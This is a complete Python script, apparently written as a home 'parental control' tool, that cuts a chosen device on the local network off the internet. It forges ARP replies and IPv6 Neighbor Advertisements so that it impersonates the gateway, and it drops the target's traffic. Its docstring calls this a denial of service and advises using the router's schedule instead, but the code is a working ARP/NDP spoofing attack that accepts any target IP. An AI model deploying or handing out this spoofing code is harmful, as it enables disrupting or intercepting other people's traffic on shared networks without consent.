#!/usr/bin/env python3
"""
Limit internet access for a device on YOUR OWN LAN (a device you are allowed to manage,
e.g. a parent limiting their own child's device). Do not use this against other people.

How it works:
  - IPv4: impersonate the gateway via ARP so the target's IPv4 traffic goes to this PC
          and is dropped.
  - IPv6: phones/tablets usually prefer IPv6, so ARP alone leaves an IPv6 path open and
          the device stays online. We also poison NDP (Neighbor Discovery): we impersonate
          the gateway's link-local (fe80::) address so the target's IPv6 internet traffic
          also goes to this PC and is dropped.

Usage:
  python net_control.py start [target_ip]   start limiting (Ctrl+C to stop and restore)
  python net_control.py stop                restore the network

Note: this is essentially a denial-of-service against that device -- it cuts it off the
internet completely, and this PC must stay running. For reliable parental control, the
router's built-in per-device schedule is far less fragile.
"""

import json
import os
import re
import subprocess
import sys
import time
import platform

from scapy.all import Ether, ARP, srp1, sendp, get_if_hwaddr, conf

# ====== Edit the IP addresses below ======
CHILD_IP = "192.168.31.38"     # target device IP (or pass it: start 192.168.31.38)
MY_IP = "192.168.31.15"        # this PC's IP
GATEWAY_IP = "192.168.31.1"     # router / gateway IP
# =========================================

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
STATE_FILE = os.path.join(SCRIPT_DIR, ".net_control.dat")
PID_FILE = os.path.join(SCRIPT_DIR, ".net_control.pid")
conf.verb = 0


def normalize_mac(mac: str) -> str:
    return re.sub(r"[^0-9A-Fa-f]", "", mac or "").lower()


def get_ipv6_gateway_ll() -> str:
    """Find the next-hop link-local address of the default IPv6 route (::/0). Windows only."""
    if platform.system() != "Windows":
        return ""
    try:
        result = subprocess.run(
            ["netsh", "interface", "ipv6", "show", "route"],
            capture_output=True, text=True, encoding="utf-8",
            errors="ignore", timeout=8, check=False,
        )
    except (OSError, subprocess.TimeoutExpired):
        return ""
    for line in result.stdout.splitlines():
        if "::/0" in line:
            match = re.search(r"(fe80::[0-9A-Fa-f:]+)", line)
            if match:
                return match.group(1)
    return ""


def find_ipv6_link_local(mac: str) -> str:
    """Find a device's link-local (fe80::) address in the system neighbor table by MAC. Windows only."""
    if platform.system() != "Windows":
        return ""
    want = normalize_mac(mac)
    try:
        result = subprocess.run(
            ["netsh", "interface", "ipv6", "show", "neighbors"],
            capture_output=True, text=True, encoding="utf-8",
            errors="ignore", timeout=8, check=False,
        )
    except (OSError, subprocess.TimeoutExpired):
        return ""
    row_re = re.compile(
        r"^\s*([0-9A-Fa-f:]+(?:%\w+)?)\s+([0-9A-Fa-f]{2}(?:-[0-9A-Fa-f]{2}){5})\s+(\S+)"
    )
    for line in result.stdout.splitlines():
        match = row_re.match(line)
        if not match:
            continue
        addr, neigh_mac, state = match.group(1), match.group(2), match.group(3).lower()
        if state in {"unreachable", "incomplete"}:
            continue
        addr = addr.split("%")[0]
        if normalize_mac(neigh_mac) == want and addr.lower().startswith("fe80"):
            return addr
    return ""


class NetController:
    def __init__(self):
        self.iface = conf.iface
        self.my_mac = get_if_hwaddr(self.iface)
        self.child_mac = None
        self.gateway_mac = None
        # IPv6 (left as None if unavailable -> automatically falls back to IPv4 only)
        self.child_ll = None
        self.gateway_ll = None
        self.ipv6_ok = False
        self.running = False

    # ---------- IPv4 / ARP ----------
    def resolve_mac(self, ip):
        result = srp1(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=3, verbose=0
        )
        return result[Ether].src if result else None

    def send_arp(self, dst_mac, dst_ip, src_mac, src_ip):
        pkt = Ether(dst=dst_mac) / ARP(
            op=2, hwsrc=src_mac, psrc=src_ip,
            hwdst=dst_mac, pdst=dst_ip
        )
        sendp(pkt, iface=self.iface, verbose=0)

    # ---------- IPv6 / NDP ----------
    def ping6_all_nodes(self):
        """Ping ff02::1 to wake devices and populate our IPv6 neighbor table so we can
        look up link-local addresses afterwards."""
        try:
            from scapy.all import IPv6, ICMPv6EchoRequest
            srp1(
                Ether(dst="33:33:00:00:00:01")
                / IPv6(dst="ff02::1") / ICMPv6EchoRequest(),
                timeout=2, verbose=0,
            )
        except Exception:
            pass

    def send_na(self, eth_dst, ip6_src, ip6_dst, target, lladdr, router):
        """Send a forged NDP Neighbor Advertisement: claim that IPv6 address `target`
        lives on the NIC `lladdr`."""
        from scapy.all import IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
        pkt = (
            Ether(dst=eth_dst)
            / IPv6(src=ip6_src, dst=ip6_dst)
            / ICMPv6ND_NA(tgt=target, R=int(router), S=0, O=1)
            / ICMPv6NDOptDstLLAddr(lladdr=lladdr)
        )
        sendp(pkt, iface=self.iface, verbose=0)

    def setup_ipv6(self):
        """Try to learn the gateway and target link-local addresses; only enable IPv6
        limiting if we got both."""
        self.ping6_all_nodes()
        self.gateway_ll = get_ipv6_gateway_ll()
        self.child_ll = find_ipv6_link_local(self.child_mac)
        self.ipv6_ok = bool(self.gateway_ll and self.child_ll)
        return self.ipv6_ok

    # ---------- spoof / restore ----------
    def spoof(self):
        # IPv4: tell the target "I am the gateway", tell the gateway "I am the target".
        self.send_arp(self.child_mac, CHILD_IP, self.my_mac, GATEWAY_IP)
        self.send_arp(self.gateway_mac, GATEWAY_IP, self.my_mac, CHILD_IP)
        # IPv6: same idea, poison both sides' mapping for the fe80:: link-local addresses.
        if self.ipv6_ok:
            self.send_na(self.child_mac, self.gateway_ll, self.child_ll,
                         self.gateway_ll, self.my_mac, router=True)
            self.send_na(self.gateway_mac, self.child_ll, self.gateway_ll,
                         self.child_ll, self.my_mac, router=False)

    def restore(self):
        for _ in range(2):
            # IPv4: restore the real MACs.
            self.send_arp(self.child_mac, CHILD_IP, self.gateway_mac, GATEWAY_IP)
            self.send_arp(self.gateway_mac, GATEWAY_IP, self.child_mac, CHILD_IP)
            # IPv6: restore the real MACs.
            if self.ipv6_ok:
                self.send_na(self.child_mac, self.gateway_ll, self.child_ll,
                             self.gateway_ll, self.gateway_mac, router=True)
                self.send_na(self.gateway_mac, self.child_ll, self.gateway_ll,
                             self.child_ll, self.child_mac, router=False)
            time.sleep(0.3)

    # ---------- state persistence ----------
    def save_state(self):
        with open(STATE_FILE, "w") as f:
            json.dump({
                "child_mac": self.child_mac,
                "gateway_mac": self.gateway_mac,
                "my_mac": self.my_mac,
                "child_ll": self.child_ll,
                "gateway_ll": self.gateway_ll,
                "ipv6_ok": self.ipv6_ok,
                "child_ip": CHILD_IP,
            }, f)

    def load_state(self):
        with open(STATE_FILE) as f:
            state = json.load(f)
            self.child_mac = state["child_mac"]
            self.gateway_mac = state["gateway_mac"]
            self.my_mac = state["my_mac"]
            self.child_ll = state.get("child_ll")
            self.gateway_ll = state.get("gateway_ll")
            self.ipv6_ok = state.get("ipv6_ok", False)

    def run(self):
        print("Resolving MAC addresses...")
        self.child_mac = self.resolve_mac(CHILD_IP)
        self.gateway_mac = self.resolve_mac(GATEWAY_IP)

        if not self.child_mac:
            print(f"[error] target device {CHILD_IP} not found")
            print("  Check: 1) the device is on and connected  2) the IP is correct")
            input("Press Enter to exit...")
            return

        if not self.gateway_mac:
            print(f"[error] gateway {GATEWAY_IP} not found")
            input("Press Enter to exit...")
            return

        print("Probing IPv6 (phones/tablets usually prefer IPv6)...")
        self.setup_ipv6()

        self.save_state()
        with open(PID_FILE, "w") as f:
            f.write(str(os.getpid()))

        print(f"Target:  {CHILD_IP} -> {self.child_mac}")
        print(f"Gateway: {GATEWAY_IP} -> {self.gateway_mac}")
        print(f"This PC: {MY_IP} -> {self.my_mac}")
        if self.ipv6_ok:
            print(f"IPv6:    target {self.child_ll}  gateway {self.gateway_ll}  -> enabled")
        else:
            print("IPv6:    not enabled (no IPv6 found for target or gateway; IPv4 only)")
            print("         If the target is a phone and still has internet, it is likely")
            print("         using IPv6 -- make sure it is online and retry, or check whether")
            print("         the router hands out IPv6.")
        print()
        print("Limiting is ON. The target device is cut off.")
        print("  Wi-Fi/Ethernet still shows connected, but it has no internet.")
        print()
        print("Press Ctrl+C or run release.bat to restore.")
        print("-" * 40)

        self.running = True
        try:
            while self.running:
                self.spoof()
                time.sleep(2)
        except KeyboardInterrupt:
            pass
        finally:
            self.restore()
            self.running = False
            for f in [STATE_FILE, PID_FILE]:
                if os.path.exists(f):
                    os.remove(f)
            print("Network restored.")


def cmd_stop():
    if not os.path.exists(STATE_FILE):
        print("No running limiter found.")
        return

    ctrl = NetController()
    ctrl.load_state()
    ctrl.restore()
    print("ARP/NDP tables restored.")

    if os.path.exists(PID_FILE):
        with open(PID_FILE) as f:
            pid = f.read().strip()
        if pid:
            os.system(f"taskkill /F /PID {pid} >nul 2>&1")
        for f in [STATE_FILE, PID_FILE]:
            if os.path.exists(f):
                os.remove(f)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "stop":
        cmd_stop()
    else:
        # Allow: start 192.168.x.x  to pick the target without editing the source.
        if len(sys.argv) > 2 and sys.argv[1] == "start":
            CHILD_IP = sys.argv[2]
        NetController().run()
